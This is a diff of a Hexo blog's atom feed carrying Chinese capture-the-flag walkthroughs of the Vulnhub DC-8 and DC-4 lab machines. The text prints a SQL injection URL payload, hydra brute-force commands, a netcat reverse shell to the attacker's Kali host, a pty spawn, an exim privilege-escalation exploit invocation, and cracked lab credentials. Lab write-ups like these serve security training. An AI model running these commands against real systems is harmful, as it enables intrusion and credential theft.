@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-10-14T09:53:01.973Z</updated>
+  <updated>2019-10-21T03:43:36.078Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Vulnhub DC-8</title>
+    <link href="http://yoursite.com/2019/10/21/%E9%9D%B6%E6%9C%BA/Vulnhub-DC-8/"/>
+    <id>http://yoursite.com/2019/10/21/靶机/Vulnhub-DC-8/</id>
+    <published>2019-10-21T03:43:21.000Z</published>
+    <updated>2019-10-21T03:43:36.078Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="vlunhub-dc8"><a href="#vlunhub-dc8" class="headerlink" title="vlunhub-dc8"></a>vlunhub-dc8</h1><h2 id="0x00-下载地址"><a href="#0x00-下载地址" class="headerlink" title="0x00 下载地址"></a>0x00 下载地址</h2><p><a href="http://www.five86.com/dc-8.html" target="_blank" rel="noopener">DC-8</a></p><h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>kali：192.168.64.133</p><p>dc-8：192.168.64.155</p><h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><ol><li><p>扫描端口</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020221007.png" alt></p></li><li><p>查看网站，查找有用信息</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020224511.png" alt></p><p>发现在访问时url处为nid=1 这种类型，可能存在sql注入，测试发现报错</p></li><li><p>获取用户名和密码</p><p>字段为1 </p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021093629.png" alt></p><p>数据库 <code>d7db</code></p><p><code>http://192.168.64.155/?nid=-1%20union%20all%20select%20database()%20--+</code></p><p>拿到用户名和密码</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021094308.png" alt></p><p>使用john破解</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095827.png" alt></p><p>接下来通过之前扫描的的信息中获取到的登录界面登录</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095720.png" alt></p></li><li><p>登录后台</p><p>和dc-7 一样，寻找可以执行php语句的地方</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103459.png" alt></p><p>测试执行语句，在<code>form settings</code>写入phpinfo</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103916.png" alt></p></li><li><p>反弹shell</p><p>尝试反弹shell</p><p>kali <code>nc -lvvp 4444</code></p><p>web页面处</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104353.png" alt></p><p>kali处成功监听，获取交互式shell</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104646.png" alt></p></li><li><p>信息收集</p><p>通过vps下载linenum 去获取服务器信息</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021105414.png" alt></p><p>这里尝试一下 sudo提权，需要密码 ，版本没有类似的漏洞，</p><p>之后在suid处存在一处可疑文件，查看版本，发现存在可利用漏洞</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021110950.png" alt></p></li><li><p>提权</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021111447.png" alt></p><p>利用此漏洞尝试提权</p><p>查看使用方式：<a href="https://www.exploit-db.com/exploits/46996" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46996</a></p><p>尝试利用<code>./46996.sh -m setuid</code>或<code>./46996.sh -m netcat</code> 提权</p><p>报错：</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021112142.png" alt></p><p>搜索发现这个报错是由于windows下编辑上传到linux下执行导致的</p><p>解决方法</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113723.png" alt></p><p>成功获取root权限</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113857.png" alt></p><p>cd到root下 查看flag</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113941.png" alt></p></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;vlunhub-dc8&quot;&gt;&lt;a href=&quot;#vlunhub-dc8&quot; class=&quot;headerlink&quot; title=&quot;vlunhub-dc8&quot;&gt;&lt;/a&gt;vlunhub-dc8&lt;/h1&gt;&lt;h2 id=&quot;0x00-下载地址&quot;&gt;&lt;a href=&quot;#0x00-下载地
+      
+    
+    </summary>
+    
+    
+      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
+    
+    
+      <category term="exim提权" scheme="http://yoursite.com/tags/exim%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
   
   <entry>
     <title>xxe demo 练习</title>
@@ -306,29 +332,6 @@
   </entry>
   
   <entry>
-    <title>Vulnhub DC-4</title>
-    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-4/"/>
-    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-4/</id>
-    <published>2019-10-04T03:02:24.000Z</published>
-    <updated>2019-10-04T03:02:25.769Z</updated>
-    
-    <content type="html"><![CDATA[<p>熟悉提权步骤，和漏洞发现</p><a id="more"></a><h1 id="Vulnhub-之-DC-4"><a href="#Vulnhub-之-DC-4" class="headerlink" title="Vulnhub 之 DC-4"></a>Vulnhub 之 DC-4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入</p><p>门的伙伴。</p><p>还是按照常例看看作者是怎么描述的吧。</p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。</span><br><span class="line"></span><br><span class="line">必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可能会有很大的帮助，但是你可以随时在@DCAU7发推给我寻求帮助，让你重新开始。但是请注意:我不会给你答案，相反，我会给你一个如何前进的想法。</span><br></pre></td></tr></table></figure><p>所以说，谷歌真的很万能。O(∩<em>∩)O哈哈~</em></p><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>记得修改DC-4的网络为NAT模式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali : 192.168.248.130</span><br><span class="line"></span><br><span class="line">DC-4 : 192.168.248.128</span><br></pre></td></tr></table></figure><h2 id="靶机复现"><a href="#靶机复现" class="headerlink" title="靶机复现"></a>靶机复现</h2><ul><li><p>扫描网段</p><p><code>nmap -sn 192.168.248.0/24</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png" alt></p><p>发现目标ip ： 192.168.248.128</p></li><li><p>扫描端口</p><p><code>nmap -sS 192.168.248.128</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721143438.png" alt></p></li><li><p>尝试爆破ssh</p><p><code>hydra  -l root -P /root/Desktop/weakpass.txt -t 5 ssh://192.168.248.128</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721144835.png" alt></p><p>一般破解需要时间所以我就做一个演示</p></li><li><p>网站搜寻线索</p><p>发现是一个登录框，</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721145420.png" alt></p><p>并且没有登录限制，尝试爆破</p><p>可以使用hydra爆破，这里我使用burp做测试</p><p>设置为<code>Cluster bomb</code>,用户给admin和root ，密码采用弱口令字典这个网上挺多的，或者使用hydra的默认字典也可以，然后线程跑高点 ， 我这里给burp设置的20，大概不到一分钟就出来了。</p></li></ul><p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721151611.png" alt></p><p>  这里只要登录成功后之后的登录都是636了</p><ul><li><p>登录发现</p><p>有三个命令可以运行，然后抓包查看发现可以在radio这块执行了系统命令，那么是否可以执行其他的命令</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721161839.png" alt></p><p>尝试执行<code>whoami</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162107.png" alt></p><p>既然可以执行一些简单的命令，我们就可以尝试去反弹shell</p><p>命令：<code>nc -e /bin/sh 192.168.248.130 4444</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162638.png" alt></p><p>获取交互模式</p><p>命令：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>之后在home的jim目录下发现了一个旧密码的备份</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721163345.png" alt></p><p>或许可以尝试用它去爆破ssh</p><p>命令：<code>chydra  -L /root/Desktop/user.txt -P /root/Desktop/dc_pass.txt -t 5 ssh://192.168.248.128</code></p><p>等待是漫长的，要有耐心</p><p>终于出来了一个  用户名：<code>jim</code> 密码：<code>jibril04</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721172645.png" alt></p><p>切换到jim用户下，打开mbox查看</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165049.png" alt></p><p>有邮件，去mail下查看，发现了jim文件获取到jim的密码</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165234.png" alt></p></li><li><p>登录charles</p><p>密码： <code>^xHhA&amp;hvim0y</code></p><p>命令：<code>sudo -l</code>查看权限 发现可以不需要密码执行teehee</p><p>百度得到提权方式</p><p>1 通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171456.png" alt></p><p>2 还有个2呢，多个想法多个活路</p><p>通过添加用户到passwd，设置其权限，之后su 访问即可获得root</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171755.png" alt></p><p>所以，最好不要给用户sudo权限，或者限制sudo权限的，这样才能保证网络安全</p></li></ul><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>今天的靶机奉上各位看官，过程简单，主要掌握提权的思路和前期爆破的等待。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;熟悉提权步骤，和漏洞发现&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
-    
-    
-      <category term="远程命令执行" scheme="http://yoursite.com/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Vulnhub DC-7</title>
     <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub-DC-7/"/>
     <id>http://yoursite.com/2019/10/04/靶机/Vulnhub-DC-7/</id>
@@ -355,21 +358,17 @@
   </entry>
   
   <entry>
-    <title>Vulnhub DC-8</title>
-    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub-DC-8/"/>
-    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub-DC-8/</id>
+    <title>Vulnhub DC-4</title>
+    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-4/"/>
+    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-4/</id>
     <published>2019-10-04T03:02:24.000Z</published>
-    <updated>2019-10-21T03:42:41.988Z</updated>
+    <updated>2019-10-04T03:02:25.769Z</updated>
     
-    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="vlunhub-dc8"><a href="#vlunhub-dc8" class="headerlink" title="vlunhub-dc8"></a>vlunhub-dc8</h1><h2 id="0x00-下载地址"><a href="#0x00-下载地址" class="headerlink" title="0x00 下载地址"></a>0x00 下载地址</h2><p><a href="http://www.five86.com/dc-8.html" target="_blank" rel="noopener">DC-8</a></p><h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>kali：192.168.64.133</p><p>dc-8：192.168.64.155</p><h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><ol><li><p>扫描端口</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020221007.png" alt></p></li><li><p>查看网站，查找有用信息</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020224511.png" alt></p><p>发现在访问时url处为nid=1 这种类型，可能存在sql注入，测试发现报错</p></li><li><p>获取用户名和密码</p><p>字段为1 </p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021093629.png" alt></p><p>数据库 <code>d7db</code></p><p><code>http://192.168.64.155/?nid=-1%20union%20all%20select%20database()%20--+</code></p><p>拿到用户名和密码</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021094308.png" alt></p><p>使用john破解</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095827.png" alt></p><p>接下来通过之前扫描的的信息中获取到的登录界面登录</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095720.png" alt></p></li><li><p>登录后台</p><p>和dc-7 一样，寻找可以执行php语句的地方</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103459.png" alt></p><p>测试执行语句，在<code>form settings</code>写入phpinfo</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103916.png" alt></p></li><li><p>反弹shell</p><p>尝试反弹shell</p><p>kali <code>nc -lvvp 4444</code></p><p>web页面处</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104353.png" alt></p><p>kali处成功监听，获取交互式shell</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104646.png" alt></p></li><li><p>信息收集</p><p>通过vps下载linenum 去获取服务器信息</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021105414.png" alt></p><p>这里尝试一下 sudo提权，需要密码 ，版本没有类似的漏洞，</p><p>之后在suid处存在一处可疑文件，查看版本，发现存在可利用漏洞</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021110950.png" alt></p></li><li><p>提权</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021111447.png" alt></p><p>利用此漏洞尝试提权</p><p>查看使用方式：<a href="https://www.exploit-db.com/exploits/46996" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46996</a></p><p>尝试利用<code>./46996.sh -m setuid</code>或<code>./46996.sh -m netcat</code> 提权</p><p>报错：</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021112142.png" alt></p><p>搜索发现这个报错是由于windows下编辑上传到linux下执行导致的</p><p>解决方法</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113723.png" alt></p><p>成功获取root权限</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113857.png" alt></p><p>cd到root下 查看flag</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113941.png" alt></p></li></ol>]]></content>
+    <content type="html"><![CDATA[<p>熟悉提权步骤，和漏洞发现</p><a id="more"></a><h1 id="Vulnhub-之-DC-4"><a href="#Vulnhub-之-DC-4" class="headerlink" title="Vulnhub 之 DC-4"></a>Vulnhub 之 DC-4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入</p><p>门的伙伴。</p><p>还是按照常例看看作者是怎么描述的吧。</p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。</span><br><span class="line"></span><br><span class="line">必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可能会有很大的帮助，但是你可以随时在@DCAU7发推给我寻求帮助，让你重新开始。但是请注意:我不会给你答案，相反，我会给你一个如何前进的想法。</span><br></pre></td></tr></table></figure><p>所以说，谷歌真的很万能。O(∩<em>∩)O哈哈~</em></p><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>记得修改DC-4的网络为NAT模式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali : 192.168.248.130</span><br><span class="line"></span><br><span class="line">DC-4 : 192.168.248.128</span><br></pre></td></tr></table></figure><h2 id="靶机复现"><a href="#靶机复现" class="headerlink" title="靶机复现"></a>靶机复现</h2><ul><li><p>扫描网段</p><p><code>nmap -sn 192.168.248.0/24</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png" alt></p><p>发现目标ip ： 192.168.248.128</p></li><li><p>扫描端口</p><p><code>nmap -sS 192.168.248.128</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721143438.png" alt></p></li><li><p>尝试爆破ssh</p><p><code>hydra  -l root -P /root/Desktop/weakpass.txt -t 5 ssh://192.168.248.128</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721144835.png" alt></p><p>一般破解需要时间所以我就做一个演示</p></li><li><p>网站搜寻线索</p><p>发现是一个登录框，</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721145420.png" alt></p><p>并且没有登录限制，尝试爆破</p><p>可以使用hydra爆破，这里我使用burp做测试</p><p>设置为<code>Cluster bomb</code>,用户给admin和root ，密码采用弱口令字典这个网上挺多的，或者使用hydra的默认字典也可以，然后线程跑高点 ， 我这里给burp设置的20，大概不到一分钟就出来了。</p></li></ul><p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721151611.png" alt></p><p>  这里只要登录成功后之后的登录都是636了</p><ul><li><p>登录发现</p><p>有三个命令可以运行，然后抓包查看发现可以在radio这块执行了系统命令，那么是否可以执行其他的命令</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721161839.png" alt></p><p>尝试执行<code>whoami</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162107.png" alt></p><p>既然可以执行一些简单的命令，我们就可以尝试去反弹shell</p><p>命令：<code>nc -e /bin/sh 192.168.248.130 4444</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162638.png" alt></p><p>获取交互模式</p><p>命令：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>之后在home的jim目录下发现了一个旧密码的备份</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721163345.png" alt></p><p>或许可以尝试用它去爆破ssh</p><p>命令：<code>chydra  -L /root/Desktop/user.txt -P /root/Desktop/dc_pass.txt -t 5 ssh://192.168.248.128</code></p><p>等待是漫长的，要有耐心</p><p>终于出来了一个  用户名：<code>jim</code> 密码：<code>jibril04</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721172645.png" alt></p><p>切换到jim用户下，打开mbox查看</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165049.png" alt></p><p>有邮件，去mail下查看，发现了jim文件获取到jim的密码</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165234.png" alt></p></li><li><p>登录charles</p><p>密码： <code>^xHhA&amp;hvim0y</code></p><p>命令：<code>sudo -l</code>查看权限 发现可以不需要密码执行teehee</p><p>百度得到提权方式</p><p>1 通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171456.png" alt></p><p>2 还有个2呢，多个想法多个活路</p><p>通过添加用户到passwd，设置其权限，之后su 访问即可获得root</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171755.png" alt></p><p>所以，最好不要给用户sudo权限，或者限制sudo权限的，这样才能保证网络安全</p></li></ul><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>今天的靶机奉上各位看官，过程简单，主要掌握提权的思路和前期爆破的等待。</p>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h1 id=&quot;vlunhub-dc8&quot;&gt;&lt;a href=&quot;#vlunhub-dc8&quot; class=&quot;headerlink&quot; title=&quot;vlunhub-dc8&quot;&gt;&lt;/a&gt;vlunhub-dc8&lt;/h1&gt;&lt;h2 id=&quot;0x00-下载地址&quot;&gt;&lt;a hr
-      
+      &lt;p&gt;熟悉提权步骤，和漏洞发现&lt;/p&gt;
     
     </summary>
     
@@ -377,7 +376,7 @@
       <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
     
     
-      <category term="drupal提权" scheme="http://yoursite.com/tags/drupal%E6%8F%90%E6%9D%83/"/>
+      <category term="远程命令执行" scheme="http://yoursite.com/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
